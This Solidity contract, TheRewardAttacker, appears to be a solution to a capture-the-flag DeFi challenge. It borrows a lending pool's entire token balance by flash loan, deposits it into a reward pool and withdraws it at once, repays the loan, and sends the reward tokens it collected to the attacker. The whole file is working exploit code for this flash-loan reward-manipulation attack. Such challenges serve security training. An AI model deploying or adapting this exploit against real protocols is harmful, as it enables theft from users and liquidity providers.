// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

import "./FlashLoanerPool.sol";
import "./TheRewarderPool.sol";

contract TheRewardAttacker {
    FlashLoanerPool private flashLoanPool;
    TheRewarderPool private rewarderPool;
    IERC20 private liquidityToken;
    IERC20 private rewardToken;
    address private player;

    constructor(FlashLoanerPool _flashLoanPool, TheRewarderPool _rewarderPool,
                IERC20 _liquidityToken, IERC20 _rewardToken, address _player) {
        flashLoanPool = _flashLoanPool;
        rewarderPool = _rewarderPool;
        liquidityToken = _liquidityToken;
        rewardToken = _rewardToken;
        player = _player;
    }

    function attack() external {
        uint256 flashLoanPoolBalance = liquidityToken.balanceOf(address(flashLoanPool));
        flashLoanPool.flashLoan(flashLoanPoolBalance);
    }

    function receiveFlashLoan(uint256 amount) external {
        liquidityToken.approve(address(rewarderPool), amount);
        rewarderPool.deposit(amount);
        rewarderPool.withdraw(amount);
        liquidityToken.transfer(address(flashLoanPool), amount);
        rewardToken.transfer(player, rewardToken.balanceOf(address(this)));
    }
}
